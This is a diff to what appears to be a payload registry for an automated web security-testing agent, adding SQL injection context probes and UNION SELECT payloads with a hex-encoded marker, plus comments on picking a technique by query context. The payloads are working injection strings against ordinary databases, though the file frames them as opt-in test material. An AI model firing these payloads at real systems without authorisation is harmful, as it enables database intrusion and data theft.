@@ -59,6 +59,39 @@ SQLI_STACKED: List[str] = [
     "1; SELECT 1--",
 ]
 
+# Context probes: decide HOW the value sits in the query before choosing a
+# technique. A numeric sink (WHERE id = $x) breaks every quote-led payload, so
+# compare these against the observed value (e.g. 1) first.
+#   2-1 / 1*1 equal to 1 and 1' different  -> numeric context
+#   1' breaks and 1'' restores             -> single-quoted string
+#   1" breaks and 1"" restores             -> double-quoted string
+#   1) breaks and 1)-- - restores          -> parenthesised expression
+SQLI_CONTEXT_PROBES: List[str] = [
+    "2-1",
+    "1*1",
+    "1'",
+    "1''",
+    '1"',
+    '1""',
+    "1)",
+    "1)-- -",
+]
+
+# UNION SELECT with a hex-encoded marker (0x5b5b5b... = "[[["). The decoded
+# marker can only appear if the database executed the query. Numeric-context
+# forms come first: cookie/path/ID sinks are usually unquoted integers.
+# Increase NULL columns (1..6) until the marker reflects.
+SQLI_UNION_BASED: List[str] = [
+    "0 UNION SELECT 0x5b5b5b4145474953-- -",
+    "0 UNION SELECT 0x5b5b5b4145474953,NULL-- -",
+    "0 UNION SELECT NULL,0x5b5b5b4145474953-- -",
+    "0 UNION SELECT 0x5b5b5b4145474953,NULL,NULL-- -",
+    "0) UNION SELECT 0x5b5b5b4145474953-- -",
+    "x' UNION SELECT 0x5b5b5b4145474953-- -",
+    "x' UNION SELECT 0x5b5b5b4145474953,NULL-- -",
+    'x" UNION SELECT 0x5b5b5b4145474953-- -',
+]
+
 # A broad payload encyclopedia is useful for research, but the agent's
 # default worklist should only suggest low-impact controls. Technique-specific
 # payloads are opt-in and still require an observed request and proof recipe.
@@ -223,6 +256,8 @@ PAYLOAD_REGISTRY: Dict[str, Dict[str, List[str]]] = {
         "boolean_based": SQLI_BOOLEAN_BASED,
         "auth_bypass": SQLI_AUTH_BYPASS,
         "stacked": SQLI_STACKED,
+        "context_probe": SQLI_CONTEXT_PROBES,
+        "union_based": SQLI_UNION_BASED,
     },
     "xss": {
         "reflected": XSS_REFLECTED,
